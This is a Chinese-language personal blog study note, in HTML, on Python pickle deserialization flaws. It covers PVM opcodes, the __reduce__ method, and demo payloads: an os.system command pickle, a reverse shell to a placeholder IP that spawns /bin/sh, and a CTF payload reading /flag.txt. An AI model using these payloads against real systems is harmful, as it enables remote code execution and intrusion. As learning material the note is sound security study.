@@ -1,0 +1,391 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Python Pickle反序列化漏洞学习笔记 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Python Pickle反序列化漏洞学习笔记 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+只是简单的学习笔记
+
+参考链接
+一篇文章带你理解漏洞之 Python 反序列化漏洞
+pickle反序列化初探
+这两篇文章写得已经非常清晰了，如果要学建议看上面的🤓
+光速QA
+Q：pickle是什么？
+A：pickle是python下的序..." />
+    <meta name="keywords" content="Pickle,学习笔记,Python" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Python Pickle反序列化漏洞学习笔记
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-07-03
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/GFaUKRKUb/" class="post-tag">
+                  # Pickle
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/SBvbIXKgV/" class="post-tag">
+                  # 学习笔记
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/c6PC98FOD/" class="post-tag">
+                  # Python
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/python-pickle-fan-xu-lie-hua-lou-dong.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <blockquote>
+<p>只是简单的学习笔记</p>
+</blockquote>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">一篇文章带你理解漏洞之 Python 反序列化漏洞</a><br>
+<a href="https://xz.aliyun.com/t/7436">pickle反序列化初探</a><br>
+这两篇文章写得已经非常清晰了，如果要学建议看上面的🤓</p>
+<h1 id="光速qa">光速QA</h1>
+<h2 id="qpickle是什么">Q：pickle是什么？</h2>
+<p>A：pickle是python下的序列化与反序列化包。</p>
+<h2 id="qpickle如何进行序列化与反序列化">Q：pickle如何进行序列化与反序列化？</h2>
+<p>A：通过四个函数</p>
+<pre><code class="language-python"># 序列化
+pickle.dump(文件) 
+pickle.dumps(字符串)
+
+# 反序列化
+pickle.load(文件)
+pickle.loads(字符串) 
+</code></pre>
+<h2 id="q举个例子">Q：举个例子</h2>
+<p>A：</p>
+<pre><code class="language-python">import pickle
+class People(object):
+    def __init__(self,name = &quot;skkyblu3&quot;):
+        self.name = name
+
+    def say(self):
+        print &quot;Hello ! My friends&quot;
+
+a = People()
+c = pickle.dumps(a)
+d = pickle.loads(c)
+d.say()
+</code></pre>
+<h2 id="q一个对象被序列化后是什么样的">Q：一个对象被序列化后是什么样的？</h2>
+<p>A：上面People类序列化之后为</p>
+<pre><code>ccopy_reg
+_reconstructor
+p0
+(c__main__
+People
+p1
+c__builtin__
+object
+p2
+Ntp3
+Rp4
+(dp5
+S'name'
+p6
+S'skkyblu3'
+p7
+sb.
+</code></pre>
+<h2 id="q这串内容是如何被解析的">Q：这串内容是如何被解析的？</h2>
+<p>A：pickle解析依靠Pickle Virtual Machine (PVM)进行。</p>
+<ul>
+<li>PVM涉及到三个部分：1. 解析引擎 2. 栈 3. 内存</li>
+<li>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 停止。最终留在栈顶的值将被作为反序列化对象返回。</li>
+<li>栈：由Python的list实现，被用来临时存储数据、参数以及对象。</li>
+<li>memo：由Python的dict实现，为PVM的生命周期提供存储。说人话：将反序列化完成的数据以 <code>key-value</code> 的形式储存在memo中，以便后来使用。</li>
+</ul>
+<p>PVM操作码（直接盗图）<br>
+<img src="https://skyblu3519.github.io/post-images/1688371211756.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688371219924.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688371226013.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688371236915.png" alt="" loading="lazy"></p>
+<p>考虑下面的内容，这个在反序列化的时候会执行<code>os.system('ls')</code></p>
+<pre><code class="language-python">import pickle
+data = &quot;&quot;&quot;cos
+system
+(S'ls'
+tR.
+&quot;&quot;&quot;
+pickle.loads(data)
+</code></pre>
+<p>结合我们上面讲述的 PVM 的操作码看这个文件中的字符串是怎么一步一步执行的：</p>
+<ol>
+<li>c 后面是模块名，换行后是类名,于是将 os.system 放入栈中</li>
+<li>( 这个是标记符，我们将一个 Mark 放入栈中</li>
+<li>S 后面是字符串，我们放入栈中</li>
+<li>t 将栈中 Mark 之前的内容取出来转化成元祖，再存入栈中 （'ls',），同时标记 Mark 消失</li>
+<li>R 将元祖取出，并将 callable 取出，然后将元祖作为 callable 的参数，并执行，对应这里就是 os.system('ls'),然后将结果再存入栈中</li>
+</ol>
+<p>用动图来帮助理解一下（这个好诶！）：<br>
+<img src="https://skyblu3519.github.io/post-images/1688366158371.gif" alt="" loading="lazy"><br>
+PVM解析<code>R</code>指令的过程动图：<br>
+<img src="https://skyblu3519.github.io/post-images/1688366442206.gif" alt="" loading="lazy"></p>
+<h2 id="q反序列化的原理大概清楚了可是要怎么利用捏">Q：反序列化的原理大概清楚了，可是要怎么利用捏？</h2>
+<p>A：和PHP一样，我们想在反序化的时候执行我们的代码。这就需要<code>__reduce__</code>这个魔术方法，这个方法是新式类(内置类)特有的。</p>
+<p>新式类（内置类）和旧式类（自建类）的区别在于有没有继承自<code>object</code>，如果一个类继承自<code>object</code>，那么它就是新式类。不过这个特性是Python2才有的，Python3开始，所有的类都被视为新式类，无论是否明确地继承自<code>object</code>。</p>
+<pre><code class="language-python"># 旧式类
+&gt;&gt;&gt; class A():
+...     pass
+...
+&gt;&gt;&gt; a = A()
+&gt;&gt;&gt; type(a)
+&lt;type 'instance'&gt;
+
+# 新式类
+&gt;&gt;&gt; class B(object):
+...     pass
+...
+&gt;&gt;&gt; b = B()
+&gt;&gt;&gt; type(b)
+&lt;class '__main__.B'&gt;
+</code></pre>
+<p>为了使用<code>__reduce__</code>我们的类需要继承自<code>object</code>。</p>
+<p>那么<code>__reduce__</code>是什么呢？</p>
+<blockquote>
+<p>当序列化以及反序列化的过程中中碰到一无所知的扩展类型（这里指的就是新式类）的时候，可以通过类中定义的__reduce__方法来告知如何进行序列化或者反序列化</p>
+</blockquote>
+<p>我们知道在PHP反序列化的时候，反序列化的类在代码中一定是声明过的。但在Python中，如果反序列化的类中有<code>__reduce__</code>，那么即使环境中没有声明，它也可以按照<code>__reduce__</code>中的方法进行反序列化，这样攻击面可以说是相当大了。下面通过一段代码来感受<code>__reduce__</code>的神奇：</p>
+<pre><code class="language-python">import pickle
+
+class A(object):
+    pass
+
+class B(object):
+    def __reduce__(self):
+        return (str, ())
+
+a = A()
+b = B()
+
+a_s = pickle.dumps(a)
+b_s = pickle.dumps(b)
+
+# 在环境中删除这两个类
+del A
+del B
+
+try:
+    # 对于不存在的类反序列失败
+    pickle.loads(a_s)       
+    print 'A is load'
+except Exception as e:
+    print e
+try:
+    # 实现了__reduce__的类，即使环境中没有定义，也能按照__reduce__中的方法反序列化
+    pickle.loads(b_s)       
+    print 'B is load'
+except Exception as e:
+    print e
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1688375338574.png" alt="" loading="lazy"></figure>
+<p>那么<code>__reduce__</code>方法如何构造呢？<code>__reduce__</code>可以返回两种类型的值，String 和 tuple ,我们的构造点就在令其返回 tuple 的时候。当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable object(可调用的对象)，第二个参数可以是一个元祖为这个可调用对象提供必要的参数。</p>
+<p>一个pickle EXP的简单demo</p>
+<pre><code class="language-python">import pickle
+import os
+
+class genpoc(object):
+    def __reduce__(self):
+        s = &quot;echo skkyblu3&quot;             # 要执行的命令
+        return (os.system, (s,))         # 返回元组
+
+e = genpoc()
+poc = pickle.dumps(e)
+print(poc)      # 反序列字符串
+</code></pre>
+<p>记一个反弹shell的demo，用到的是<code>python -c</code>：</p>
+<pre><code class="language-python">class A(object):
+    def __reduce__(self):
+        a = &quot;&quot;&quot;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&quot;&quot;&quot;
+        return (os.system,(a,)) 
+</code></pre>
+<p>所以上周那道<code>ikun</code>就是用了eval来读取flag的内容，还是比较简单的</p>
+<pre><code class="language-python">import os
+import pickle
+import urllib
+
+class exp(object):
+    def __reduce__(self):
+        return (eval,(&quot;open('/flag.txt').read()&quot;,))
+
+a=exp()
+s=pickle.dumps(a)
+print urllib.quote(s)
+</code></pre>
+<h2 id="q还有内容吗">Q：还有内容吗？</h2>
+<p>A：剩下的内容主要有三个</p>
+<ul>
+<li>序列化更复杂的代码去执行</li>
+<li>手写 opcode</li>
+<li>pker的使用，用于将Python源代码自动转换为Pickle opcode的工具</li>
+</ul>
+<h2 id="q为什么不写了">Q：为什么不写了？</h2>
+<p>A：今天不想看了，之后再说吧🥱</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+<li><a href="#%E5%85%89%E9%80%9Fqa">光速QA</a>
+<ul>
+<li><a href="#qpickle%E6%98%AF%E4%BB%80%E4%B9%88">Q：pickle是什么？</a></li>
+<li><a href="#qpickle%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Q：pickle如何进行序列化与反序列化？</a></li>
+<li><a href="#q%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90">Q：举个例子</a></li>
+<li><a href="#q%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1%E8%A2%AB%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E6%98%AF%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84">Q：一个对象被序列化后是什么样的？</a></li>
+<li><a href="#q%E8%BF%99%E4%B8%B2%E5%86%85%E5%AE%B9%E6%98%AF%E5%A6%82%E4%BD%95%E8%A2%AB%E8%A7%A3%E6%9E%90%E7%9A%84">Q：这串内容是如何被解析的？</a></li>
+<li><a href="#q%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%8E%9F%E7%90%86%E5%A4%A7%E6%A6%82%E6%B8%85%E6%A5%9A%E4%BA%86%E5%8F%AF%E6%98%AF%E8%A6%81%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8%E6%8D%8F">Q：反序列化的原理大概清楚了，可是要怎么利用捏？</a></li>
+<li><a href="#q%E8%BF%98%E6%9C%89%E5%86%85%E5%AE%B9%E5%90%97">Q：还有内容吗？</a></li>
+<li><a href="#q%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E5%86%99%E4%BA%86">Q：为什么不写了？</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/yi-zhou-xi-ti-ai-fu-4/">
+              <h3 class="post-title">
+                一周西踢艾福（4）
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
